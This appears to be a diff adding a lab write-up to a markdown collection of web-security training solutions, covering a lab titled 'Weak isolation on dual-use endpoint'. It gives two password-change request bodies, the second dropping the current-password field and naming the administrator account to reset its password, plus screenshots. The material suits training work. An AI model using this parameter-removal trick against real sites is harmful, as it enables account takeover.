@@ -324,6 +324,24 @@ now the email end with ``@dontwannacry.com`` and ``admin panal`` tap appear
   <summary>Lab: Weak isolation on dual-use endpoint</summary>
 
 
+1. login as **`wiener`**
+2. try to change it's password
+
+```
+csrf=xnA1Oakwv5UDQ52xSxV4UaMJhuemakJs&username=Wiener&current-password=peter&new-password-1=123&new-password-2=123
+```
+4. if you try to change username will refuse because the current password put if you delete the current password it will changed
+
+
+```
+csrf=xnA1Oakwv5UDQ52xSxV4UaMJhuemakJs&username=administrator&new-password-1=123&new-password-2=123
+```
+
+
+<img width="1459" height="835" alt="image" src="https://github.com/user-attachments/assets/e1d2a07b-3d0a-4e1e-a60d-4a14f7e7030c" />
+
+
+<img width="1719" height="688" alt="image" src="https://github.com/user-attachments/assets/7bbf768c-c5f2-4b88-a324-3ad386b45c2d" />
 
 
   
